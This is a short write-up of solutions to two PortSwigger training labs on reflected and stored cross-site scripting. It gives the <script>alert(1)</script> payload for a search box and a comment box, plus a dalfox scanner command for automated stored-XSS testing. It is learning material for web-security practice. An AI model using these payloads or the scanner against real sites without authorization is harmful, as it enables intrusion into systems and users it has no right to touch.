<!-- omit in toc -->
# XSS

<!-- omit in toc -->
## Table of Contents

- [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
- [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)

## Reflected XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

<!-- omit in toc -->
### Solution
1. Copy and paste the following into the search box: ``<script>alert(1)</script>``
2. Click "Search".

## Stored XSS into HTML context with nothing encoded
Reference: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

<!-- omit in toc -->
### Quick Solution
Although this is an **extremely** easy lab to complete I also tried a tool called ``dalfox`` that is able to perform Store XSS assessments. The command I used is the following (on version 2.5.5):
```
dalfox sxss -X POST "<target_url>/post/comment" -d "csrf=<crsf_token>&postId=2&comment=thelicato&name=thelicato&email=the@lica.to&website=" -p "comment" --cookie="session=<session_cookie>" --trigger "<target_url>/post?postId=2" --request-method GET -w 1
```
The requests can also be proxied to Burp by adding ``--proxy <proxy_url>``

<!-- omit in toc -->
### Solution
1. Enter the following into the comment box: ``<script>alert(1)</script>``
2. Enter a name, email and website.
3. Click "Post comment".
4. Go back to the blog.